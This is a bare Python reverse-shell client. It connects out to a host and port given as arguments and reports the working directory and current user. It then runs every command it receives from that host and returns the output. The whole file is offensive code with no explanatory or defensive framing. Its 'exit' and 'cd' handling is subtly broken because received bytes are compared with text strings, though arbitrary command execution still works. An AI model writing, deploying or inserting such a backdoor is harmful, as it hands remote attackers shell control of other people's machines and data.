import socket;
import os;
import subprocess;
import sys;

serverHost = sys.argv[1];
serverPort = int(sys.argv[2]);
bufferSize = 1024 * 128;
separator = "<sep>";

s = socket.socket();
s.connect((serverHost, serverPort));

cwd = os.getcwd();
whoami = subprocess.getoutput("whoami");
s.send(f"{cwd}{separator}{whoami}".encode());

while True:
    command = s.recv(bufferSize);
    splitedCommand = command.split();
    if command.lower() == "exit":
        s.close();
        break;
    if splitedCommand[0].lower() == "cd":
        try:
            os.chdir(" ".join(splitedCommand[1:]));
        except FileNotFoundError as error:
            output = str(error);
        else:
            output = "";
    else:
        output = subprocess.getoutput(command);
    cwd = os.getcwd();
    message = f"{output}{separator}{cwd}";
    s.send(message.encode());
